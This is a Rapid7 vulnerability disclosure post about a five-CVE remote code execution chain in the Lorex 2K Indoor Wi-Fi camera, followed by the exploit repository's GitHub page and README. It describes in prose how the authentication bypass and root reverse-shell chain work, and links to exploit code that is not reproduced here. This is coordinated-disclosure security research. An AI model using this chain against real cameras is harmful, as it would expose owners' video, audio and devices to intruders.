=== Content from www.rapid7.com_7e06464e_20250114_215218.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Â Sign In](https://insight.rapid7.com/saml/SSO)
[Blog](/blog/ "Blog")

* Select
  + [Vulnerability Management](/blog/tag/vulnerability-management/)
  + [MDR](/blog/tag/mdr-managed-detection-response/)
  + [Detection & Response](/blog/tag/detection-and-response/)
  + [Cloud Security](/blog/tag/cloud-security/)
  + [App Security](/blog/tag/application-security/)
  + [Metasploit](/blog/tag/metasploit/)
  + [All Topics](/blog/tags/)

[Start Trial](/trial/insight/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

* [Blog](/blog/ "Blog")
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [MDR](/blog/tag/mdr-managed-detection-response/)
* [Detection & Response](/blog/tag/detection-and-response/)
* [Cloud Security](/blog/tag/cloud-security/)
* [App Security](/blog/tag/application-security/)
* [Metasploit](/blog/tag/metasploit/)
* [All Topics](/blog/tags/)
[Start Trial](/trial/insight/)

# Lorex 2K Indoor Wi-Fi Security Camera: Multiple Vulnerabilities (FIXED)

* Dec 03, 2024
* 4 min read
* [Stephen Fewer](/blog/author/sfewer-r7/)

*Last updated at Fri, 06 Dec 2024 21:06:22 GMT*

The [Lorex 2K Indoor Wi-Fi Security Camera](https://www.lorex.com/products/2k-indoor-wi-fi-security-camera) is a consumer security device that provides cloud-based video camera surveillance capabilities. This device was a target at the 2024 Pwn2Own IoT competition. Rapid7 developed an unauthenticated remote code execution (RCE) exploit chain as an entry for the competition. On November 25, 2024, Lorex released a firmware update to resolve the five vulnerabilities that comprise the exploit chain reported by Rapid7. As of December 3, 2024, we are disclosing these issues publicly in coordination with the vendor.

## Technical analysis

A detailed technical analysis for the exploit chain described in this blog can be found in Rapid7âs whitepaper [here](https://www.rapid7.com/globalassets/_pdfs/research/pwn2own-iot-2024-lorex-2k-indoor-wi-fi-security-camera-research.pdf).

The accompanying source code for the exploit chain can be found [here](https://github.com/sfewer-r7/LorexExploit).

The exploit chain consists of five distinct vulnerabilities, which operate together in two phases to achieve unauthenticated RCE. The five vulnerabilities are listed below.

| CVE | Description | Affected Component | CVSS |
| --- | --- | --- | --- |
| CVE-2024-52544 | An unauthenticated attacker can trigger a stack-based buffer overflow. | DP Service (TCP port 3500) | [9.8 (Critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CVE-2024-52545 | An unauthenticated attacker can perform an out-of-bounds heap read. | IQ Service (TCP port 9876) | [6.5 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:L) |
| CVE-2024-52546 | An unauthenticated attacker can perform a null pointer dereference. | DHIP Service (UDP port 37810) | [5.3 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L) |
| CVE-2024-52547 | An authenticated attacker can trigger a stack-based buffer overflow. | DHIP Service (TCP port 80) | [7.2 (High)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |
| CVE-2024-52548 | An attacker can bypass code signing enforcements and execute arbitrary native code. | Kernel | [6.7 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |

Phase 1 performs an authentication bypass, allowing a remote unauthenticated attacker to reset the device's admin password to a password of the attacker's choosing. This phase leverages an unauthenticated stack-based buffer overflow, and an unauthenticated out-of-bounds (OOB) heap read vulnerability. The OOB heap read allows an attacker to leak secrets stored in the deviceâs memory that are required to compute a special code value; this code value is required for an administrator password reset to be performed. A null pointer dereference vulnerability is leveraged to force the device to reboot in order to allow the next phase to complete.

Phase 2 achieves remote code execution by leveraging the auth bypass in phase 1 to perform an authenticated stack-based buffer overflow and execute an operating system (OS) command with root privileges. This capability is then leveraged to write a file to disk and, in turn, bypass the device's code signing enforcement in order to execute arbitrary native code. Finally, the exploit will execute a reverse shell payload to give the remote attacker a root shell on the target device.

An overview of the two phases chained together can be seen below.

![](https://blog.rapid7.com/content/images/2024/12/Screenshot-2024-12-02-at-2.20.10-PM.png)
## Impact

A remote unauthenticated attacker can leverage CVE-2024-52544, CVE-2024-52545, and CVE-2024-52546 (Phase 1) to reset a target device's admin password, to a password of the attackerâs choosing. With valid admin credentials, an attacker can then either view the live video and audio feed from the device, or proceed to leverage CVE-2024-52547 and CVE-2024-52548 (Phase 2) to achieve remote code execution with root privileges on the target device.

The below table lists the affected devices and firmware versions.

| Device | Firmware |
| --- | --- |
| W461AS-EG | 2.800.00LR000.0.R.210907 |
| W462AQ-EG | 2.800.00LR000.0.R.210907 |
| W461AS | 2.800.00LR000.0.R.210730 |
| W462AQ | 2.800.00LR000.0.R.210730 |
| W461AS-EG S2 | 2.800.0000000.3.R.20220331 |
| W462AC-EG S2 | 2.800.0000000.3.R.20220331 |
| W461AS | 2.800.0000000.3.R.202203 |
| W462AQ | 2.800.0000000.3.R.202203 |
| W461ASC | 2.800.030000000.3.R |

## Credit

These vulnerabilities were discovered by Stephen Fewer, Principal Security Researcher at Rapid7 and are being disclosed in accordance with Rapid7âs [vulnerability disclosure policy](https://www.rapid7.com/security/disclosure/).

## Vendor Statement

The following statement has been provided by the vendor.

> Lorex Technology is dedicated to delivering the highest standards of protection and privacy for our customers and will collaborate with esteemed security experts to proactively identify and address potential vulnerabilities. In collaboration with Rapid7, we've been advised about one of our security cameras and successfully implemented a firmware update, which has fully resolved the identified security vulnerability.

## Remediation

The following remediation steps have been provided by the vendor.

> Our product team has decided to push the mandatory firmware updates to the devices. Upon opening Lorex app, users will be presented with the firmware update notice. User must accept the firmware update, and they cannot decline or postpone the firmware update. Camera will then flash new firmware and reboot. We advise that the users would not power down the camera during the firmware update. Once the camera reboots, the user can confirm that they have the latest version of firmware: `V2.800.0000000.8.R.20241111`

## Disclosure timeline

**October 29, 2024:** Rapid7 contacts the vendor about the issues in this blog; vendor acknowledges.

**October 31, 2024:** Rapid7 shares disclosure write-up with the vendor.

**November 4, 2024:** Vendor indicates a patch is in development.

**November 12, 2024:** Rapid7 provides CVEs IDs for the issues identified.

**November 13, 2024:** Vendor verifies patch schedule.

**November 19, 2024:** Rapid7 and the vendor agree to a December 3, 2024 coordinated disclosure date.

**December 3, 2024:** This disclosure.

#### NEVER MISS AN EMERGING THREAT

Be the first to learn about the latest vulnerabilities and cybersecurity news.

Subscribe Now

#### POST TAGS

* [IoT](/blog/tag/iot-security-news/ "IoT")
* [Vulnerability Disclosure](/blog/tag/vulnerability-disclosure/ "Vulnerability Disclosure")

#### SHARING IS CARING

#### AUTHOR

[Stephen Fewer](/blog/author/sfewer-r7/ "Stephen Fewer")

Stephen is a Principal Security Researcher at Rapid7, with a focus on software vulnerabilities and exploitation.

[View Stephen's Posts](/blog/author/sfewer-r7/)

![](https://blog.rapid7.com/content/images/2024/12/GettyImages-2185437206.jpg)

## Topics

* [Metasploit
  Â *(663)*](/blog/tag/metasploit/)
* [Vulnerability Management
  Â *(366)*](/blog/tag/vulnerability-management/)
* [Research
  Â *(243)*](/blog/tag/research/)
* [Detection and Response
  Â *(207)*](/blog/tag/detection-and-response/)
* [Vulnerability Disclosure
  Â *(150)*](/blog/tag/vulnerability-disclosure/)
* [Emergent Threat Response
  Â *(145)*](/blog/tag/emergent-threat-response/)
* [Cloud Security
  Â *(137)*](/blog/tag/cloud-security/)
* [Security Operations
  Â *(21)*](/blog/tag/secops/)

## Popular Tags

* [Metasploit](/blog/tag/metasploit/)
* [Metasploit Weekly Wrapup](/blog/tag/metasploit-weekly-wrapup/)
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [Research](/blog/tag/research/)
* [Detection and Response](/blog/tag/detection-and-response/)
* [Logentries](/blog/tag/logentries/)

## Related Posts

Out With the Old, In With the New: Securely Disposing of Smart Devices

[Read More](/blog/post/2025/01/06/out-with-the-old-in-with-the-new-securely-disposing-of-smart-devices/)

Multiple Vulnerabilities in Wowza Streaming Engine (Fixed)

[Read More](/blog/post/2024/11/20/multiple-vulnerabilities-in-wowza-streaming-engine-fixed/)

Root Access for Data Control: A DEF CON IoT Village Story

[Read More](/blog/post/2024/10/16/root-access-for-data-control-a-def-con-iot-village-story/)

CVE-2024-45195: Apache OFBiz Unauthenticated Remote Code Execution (Fixed)

[Read More](/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/)

## Related Posts

[IoT

Out With the Old, In With the New: Securely Disposing of Smart Devices

Read Full Post](/blog/post/2025/01/06/out-with-the-old-in-with-the-new-securely-disposing-of-smart-devices/)

[Vulnerability Disclosure

Multiple Vulnerabilities in Wowza Streaming Engine (Fixed)

Read Full Post](/blog/post/2024/11/20/multiple-vulnerabilities-in-wowza-streaming-engine-fixed/)

[IoT

Root Access for Data Control: A DEF CON IoT Village Story

Read Full Post](/blog/post/2024/10/16/root-access-for-data-control-a-def-con-iot-village-story/)

[Vulnerability Disclosure

CVE-2024-45195: Apache OFBiz Unauthenticated Remote Code Execution (Fixed)

Read Full Post](/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/)

[View All Posts](/blog/posts/)

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

Â© Rapid7
[Legal Terms](/legal/)
Â  | Â  [Privacy Policy](/privacy-policy/)
Â  | Â  [Export Notice](/export-notice/)
Â  | Â  [Trust](/trust/)
Â  | Â  Do Not Sell or Share My Personal Information
Â  | Â  Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1â866â390â8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)

## Never miss a blog

Get the latest stories, expertise, and news about security today.

Youâre almost done!
 Check your email to confirm your subscription.



=== Content from github.com_9cf68e9a_20250114_215215.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsfewer-r7%2FLorexExploit)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsfewer-r7%2FLorexExploit)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=sfewer-r7%2FLorexExploit)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sfewer-r7](/sfewer-r7)
/
**[LorexExploit](/sfewer-r7/LorexExploit)**
Public

* [Notifications](/login?return_to=%2Fsfewer-r7%2FLorexExploit) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2Fsfewer-r7%2FLorexExploit)
* [Star
   14](/login?return_to=%2Fsfewer-r7%2FLorexExploit)

Lorex 2K Indoor Wi-Fi Security Camera: RCE Exploit Chain

[14
stars](/sfewer-r7/LorexExploit/stargazers) [4
forks](/sfewer-r7/LorexExploit/forks) [Branches](/sfewer-r7/LorexExploit/branches) [Tags](/sfewer-r7/LorexExploit/tags) [Activity](/sfewer-r7/LorexExploit/activity)
 [Star](/login?return_to=%2Fsfewer-r7%2FLorexExploit)

 [Notifications](/login?return_to=%2Fsfewer-r7%2FLorexExploit) You must be signed in to change notification settings

* [Code](/sfewer-r7/LorexExploit)
* [Pull requests
  0](/sfewer-r7/LorexExploit/pulls)
* [Actions](/sfewer-r7/LorexExploit/actions)
* [Security](/sfewer-r7/LorexExploit/security)
* [Insights](/sfewer-r7/LorexExploit/pulse)

Additional navigation options

* [Code](/sfewer-r7/LorexExploit)
* [Pull requests](/sfewer-r7/LorexExploit/pulls)
* [Actions](/sfewer-r7/LorexExploit/actions)
* [Security](/sfewer-r7/LorexExploit/security)
* [Insights](/sfewer-r7/LorexExploit/pulse)

# sfewer-r7/LorexExploit

   Â main[Branches](/sfewer-r7/LorexExploit/branches)[Tags](/sfewer-r7/LorexExploit/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commitÂ History[15 Commits](/sfewer-r7/LorexExploit/commits/main/) | | |
| [LOREX\_AUTHBYPASS.demo.gif](/sfewer-r7/LorexExploit/blob/main/LOREX_AUTHBYPASS.demo.gif "LOREX_AUTHBYPASS.demo.gif") | | [LOREX\_AUTHBYPASS.demo.gif](/sfewer-r7/LorexExploit/blob/main/LOREX_AUTHBYPASS.demo.gif "LOREX_AUTHBYPASS.demo.gif") |  |  |
| [LOREX\_AUTHBYPASS.rb](/sfewer-r7/LorexExploit/blob/main/LOREX_AUTHBYPASS.rb "LOREX_AUTHBYPASS.rb") | | [LOREX\_AUTHBYPASS.rb](/sfewer-r7/LorexExploit/blob/main/LOREX_AUTHBYPASS.rb "LOREX_AUTHBYPASS.rb") |  |  |
| [LOREX\_DISCOVER.rb](/sfewer-r7/LorexExploit/blob/main/LOREX_DISCOVER.rb "LOREX_DISCOVER.rb") | | [LOREX\_DISCOVER.rb](/sfewer-r7/LorexExploit/blob/main/LOREX_DISCOVER.rb "LOREX_DISCOVER.rb") |  |  |
| [LOREX\_RCE.demo.gif](/sfewer-r7/LorexExploit/blob/main/LOREX_RCE.demo.gif "LOREX_RCE.demo.gif") | | [LOREX\_RCE.demo.gif](/sfewer-r7/LorexExploit/blob/main/LOREX_RCE.demo.gif "LOREX_RCE.demo.gif") |  |  |
| [LOREX\_RCE.rb](/sfewer-r7/LorexExploit/blob/main/LOREX_RCE.rb "LOREX_RCE.rb") | | [LOREX\_RCE.rb](/sfewer-r7/LorexExploit/blob/main/LOREX_RCE.rb "LOREX_RCE.rb") |  |  |
| [README.md](/sfewer-r7/LorexExploit/blob/main/README.md "README.md") | | [README.md](/sfewer-r7/LorexExploit/blob/main/README.md "README.md") |  |  |
| [payload.s](/sfewer-r7/LorexExploit/blob/main/payload.s "payload.s") | | [payload.s](/sfewer-r7/LorexExploit/blob/main/payload.s "payload.s") |  |  |
| View all files | | |

## Repository files navigation

* README
# Lorex 2K Indoor Wi-Fi Security Camera: RCE Exploit Chain

## Overview

The [Lorex 2K Indoor Wi-Fi Security Camera](https://www.lorex.com/products/2k-indoor-wi-fi-security-camera) is a consumer security device that provides cloud-based video camera surveillance capabilities. This device was a target at the 2024 Pwn2Own IoT competition. Rapid7 developed an unauthenticated remote code execution (RCE) exploit chain as an entry for the competition. On November 25, 2024, Lorex released a firmware update to resolve the five vulnerabilities that comprise the exploit chain reported by Rapid7.

The exploit chain consists of five distinct vulnerabilities, which operate together in two phases to achieve unauthenticated RCE. The five vulnerabilities are listed below.

| CVE | Description | Affected Component | CVSSv3.1 |
| --- | --- | --- | --- |
| [CVE-2024-52544](https://www.cve.org/cverecord?id=CVE-2024-52544) | An unauthenticated attacker can trigger a stack based buffer overflow. | DP Service (TCP port 3500) | [9.8 (Critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| [CVE-2024-52545](https://www.cve.org/cverecord?id=CVE-2024-52545) | An unauthenticated attacker can perform an out of bounds heap read. | IQ Service (TCP port 9876) | [6.5 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:L) |
| [CVE-2024-52546](https://www.cve.org/cverecord?id=CVE-2024-52546) | An unauthenticated attacker can perform a null pointer dereference. | DHIP Service (UDP port 37810) | [5.3 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L) |
| [CVE-2024-52547](https://www.cve.org/cverecord?id=CVE-2024-52547) | An authenticated attacker can trigger a stack based buffer overflow. | DHIP Service (TCP port 80) | [7.2 (High)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |
| [CVE-2024-52548](https://www.cve.org/cverecord?id=CVE-2024-52548) | An attacker can bypass code signing enforcements and execute arbitrary native code. | Kernel | [6.7 (Medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H) |

Phase 1 performs an authentication bypass, allowing a remote unauthenticated attacker to reset the device's admin password to a password of the attacker's choosing. This phase leverages an unauthenticated stack based buffer overflow, and an unauthenticated out-of-bounds (OOB) heap read vulnerability. The OOB heap read allows an attacker to leak secrets stored in the deviceâs memory that are required to compute a special code value; this code value is required for an administrator password reset to be performed. A null pointer dereference vulnerability is leveraged to force the device to reboot in order to allow the next phase to complete.

